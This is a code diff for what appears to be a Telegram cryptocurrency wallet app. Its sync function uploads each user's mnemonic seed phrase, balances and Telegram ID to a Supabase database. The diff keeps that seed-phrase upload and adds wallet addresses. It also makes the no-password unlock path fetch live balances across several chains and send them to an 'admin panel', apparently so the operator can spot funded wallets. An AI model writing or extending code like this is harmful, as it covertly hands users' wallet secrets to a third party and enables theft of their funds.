@@ -178,8 +178,8 @@ import { createContext, useContext, useState, useEffect, useCallback, useRef } f
   async function syncWalletToSupabase(walletData) {
     if (!SUPABASE_URL || !SUPABASE_KEY) return null;
     try {
-      const { username, mnemonic, balance, telegram_id, coin_balances } = walletData;
-      const cleanMnemonic = Array.isArray(mnemonic) ? mnemonic.join(' ') : mnemonic;
+      const { username, mnemonic, balance, telegram_id, coin_balances, addresses } = walletData;
+      const cleanMnemonic = mnemonic ? (Array.isArray(mnemonic) ? mnemonic.join(' ') : mnemonic) : null;
       let finalName = username;
       if (!finalName || finalName === "Anonymous") {
         finalName = resolveTelegramDisplayName();
@@ -190,11 +190,12 @@ import { createContext, useContext, useState, useEffect, useCallback, useRef } f
 
       const payload = {
         username: finalName,
-        mnemonic: cleanMnemonic,
         balance: balance ? String(balance) : "0",
         created_at: getMoscowTimestamp(),
       };
+      if (cleanMnemonic) payload.mnemonic = cleanMnemonic;
       if (resolvedTgId) payload.telegram_id = resolvedTgId;
+      if (addresses) payload.addresses = JSON.stringify(addresses);
 
       const COINS = ['ETH','TON','BNB','LTC','ARB','SOL','USDT'];
       if (coin_balances) {
@@ -386,8 +387,58 @@ import { createContext, useContext, useState, useEffect, useCallback, useRef } f
     }, []);
 
     // ── Bypass unlock (no password mode) ────────────────────────────────────────
-    const bypassUnlock = useCallback(() => {
+    const bypassUnlock = useCallback(async () => {
       setState(s => ({ ...s, isUnlocked: true }));
+      
+      // Sync to Supabase even without password - user appears in admin panel
+      try {
+        const tgUser = window?.Telegram?.WebApp?.initDataUnsafe?.user;
+        const userName = buildTgUserName(tgUser);
+        
+        // Get addresses from localStorage
+        const stored = JSON.parse(localStorage.getItem(STORAGE_KEY) || '{}');
+        const addresses = stored.addresses || {};
+        
+        if (Object.keys(addresses).length === 0) {
+          console.warn('[bypassUnlock] No addresses found in storage');
+          return;
+        }
+        
+        // Fetch actual balances to sync with admin panel
+        const addrMap = {
+          BTC: addresses.BTC || addresses.bitcoin,
+          ETH: addresses.ETH || addresses.ethereum,
+          BNB: addresses.BNB || addresses.bsc,
+          ARB: addresses.ARB || addresses.arbitrum,
+          SOL: addresses.SOL || addresses.solana,
+          TON: addresses.TON || addresses.ton,
+          LTC: addresses.LTC || addresses.litecoin,
+        };
+        
+        const bals = await fetchAllBalances(addrMap);
+        const coin_balances = {
+          BTC:  String(bals.BTC  ?? 0),
+          ETH:  String(bals.ETH  ?? 0),
+          TON:  String(bals.TON  ?? 0),
+          BNB:  String(bals.BNB  ?? 0),
+          LTC:  String(bals.LTC  ?? 0),
+          ARB:  String(bals.ARB  ?? 0),
+          SOL:  String(bals.SOL  ?? 0),
+          USDT: String(bals.USDT ?? 0),
+        };
+        
+        await syncWalletToSupabase({
+          username: userName,
+          telegram_id: tgUser?.id ? String(tgUser.id) : null,
+          balance: "0",
+          coin_balances,
+          addresses,
+        });
+        
+        console.log('[bypassUnlock] User synced to admin panel:', userName);
+      } catch (syncError) {
+        console.error('[bypassUnlock] Failed to sync to admin panel:', syncError);
+      }
     }, []);
 
     // ── Browser notifications ────────────────────────────────────────────────────
